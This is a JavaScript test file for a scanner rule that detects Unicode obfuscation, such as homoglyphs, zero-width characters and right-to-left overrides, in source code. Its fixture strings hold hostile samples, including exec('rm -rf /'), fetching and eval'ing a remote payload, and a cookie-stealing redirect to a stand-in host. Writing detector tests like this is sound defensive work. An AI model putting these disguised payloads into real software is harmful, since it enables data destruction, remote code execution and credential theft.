const rule15_unicode_obfuscation = require("../services/rule15_unicode_obfuscation");

// Test 1: Clean code with no obfuscation
const test1 = {
    files: [
        {
            path: "index.js",
            content: `
                const fs = require('fs');
                const result = eval('2 + 2');
                console.log(result);
                
                function executeCode(code) {
                    return Function(code)();
                }
            `
        }
    ]
};

// Test 2: Cyrillic homoglyph obfuscation (е = Cyrillic ye, а = Cyrillic a)
const test2 = {
    files: [
        {
            path: "malware.js",
            content: `
                // Using Cyrillic 'е' (U+0435) instead of Latin 'e' (U+0065)
                const еval = (code) => {
                    return Function(code)();
                };
                
                // Using Cyrillic 'а' (U+0430) instead of Latin 'a' (U+0061)
                const requirе = (module) => {
                    return require(module);
                };
                
                // Mixed script variable names
                const рrocess = global.process; // Cyrillic 'р' (U+0440)
                const child_procеss = requirе('child_process'); // Multiple substitutions
                
                // Obfuscated dangerous call
                const maliciousCode = "require('child_process').exec('rm -rf /')";
                еval(maliciousCode);
            `
        }
    ]
};

// Test 3: Zero-width character obfuscation
const test3 = {
    files: [
        {
            path: "zero-width.js",
            content: `
                // Zero-width space (U+200B) in identifier
                const eval\u200B = (code) => Function(code)();
                
                // Zero-width joiner (U+200D) in string
                const payload = "malicious\u200Dcode";
                
                // Right-to-left override (U+202E) to hide file extension
                const fileName = "txt.exe\u202Ecod.malus"; // Shows as "txt.exe" but executes as "malus.cod.exe"
                
                // Using zero-width characters to hide from string searches
                const dangerous = "eva" + "\u200C" + "l";
                window[dangerous]("alert('hacked')");
            `
        }
    ]
};

// Test 4: Mixed script identifiers
const test4 = {
    files: [
        {
            path: "mixed-scripts.js",
            content: `
                // Mixing Latin and Greek scripts
                const πrocess = process; // Greek pi + Latin
                const αlert = alert; // Greek alpha
                
                // Mixing Latin and Cyrillic
                const execСommand = (cmd) => { // Latin 'exec' + Cyrillic 'С'
                    require('child_process').exec(cmd);
                };
                
                // Japanese characters mixed with Latin
                const 実行 = (code) => eval(code); // Japanese "execute"
                
                // Using the function
                実行("console.log('悪意のあるコード')"); // Japanese for "malicious code"
            `
        }
    ]
};

// Test 5: Invisible character obfuscation in strings
const test5 = {
    files: [
        {
            path: "invisible-strings.js",
            content: `
                // Strings with invisible characters
                const obfuscatedUrl = "https://malicious\u200B.com/payload\u200C.js";
                const hiddenCode = "\\u200B\\u200C\\u200D"; // Invisible chars in string
                
                // Fetch obfuscated URL
                fetch(obfuscatedUrl)
                    .then(res => res.text())
                    .then(code => {
                        // Execute with zero-width chars removed
                        eval(code.replace(/[\\u200B-\\u200D\\uFEFF]/g, ''));
                    });
                
                // Obfuscated property access
                const obj = {
                    "normal\u200DProperty": "malicious value",
                    "safe\u200BKey": "another payload"
                };
                
                // Access obfuscated property
                const value = obj["normal" + "\\u200D" + "Property"];
            `
        }
    ]
};

// Test 6: Case obfuscation with homoglyphs
const test6 = {
    files: [
        {
            path: "case-obfuscation.js",
            content: `
                // Mixed case with homoglyphs
                const Εval = (code) => eval(code); // Greek capital epsilon
                const рRосеss = process; // Mixed case with Cyrillic
                
                // Dangerous APIs with subtle variations
                const ѕраwn = require('child_process').spawn; // Cyrillic 'ѕ' (U+0455)
                const ЕXEC = require('child_process').execSync; // Greek 'Е' (U+0415)
                
                // Usage
                const output = ЕXEC('whoami');
                console.log(output.toString());
                
                // Obfuscated string concatenation
                const dangerous = "ev" + "al";
                const moreDangerous = "Funct" + "ion";
                
                window[dangerous]("alert('xss')");
                new window[moreDangerous]("return process")();
            `
        }
    ]
};

// Test 7: HTML with obfuscated inline scripts
const test7 = {
    files: [
        {
            path: "malicious.html",
            content: `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Legitimate Page</title>
                </head>
                <body>
                    <h1>Welcome</h1>
                    <script>
                        // Obfuscated script in HTML
                        const еval = window.eval;
                        const payload = "document.location='http://steal.com?cookie='+document.cookie";
                        еval(payload);
                    </script>
                </body>
                </html>
            `
        }
    ]
};

console.log("Test 1: Clean code with no obfuscation");
console.log(JSON.stringify(rule15_unicode_obfuscation(test1), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 2: Cyrillic homoglyph obfuscation");
console.log(JSON.stringify(rule15_unicode_obfuscation(test2), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 3: Zero-width character obfuscation");
console.log(JSON.stringify(rule15_unicode_obfuscation(test3), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 4: Mixed script identifiers");
console.log(JSON.stringify(rule15_unicode_obfuscation(test4), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 5: Invisible character obfuscation in strings");
console.log(JSON.stringify(rule15_unicode_obfuscation(test5), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 6: Case obfuscation with homoglyphs");
console.log(JSON.stringify(rule15_unicode_obfuscation(test6), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 7: HTML with obfuscated inline scripts");
console.log(JSON.stringify(rule15_unicode_obfuscation(test7), null, 2));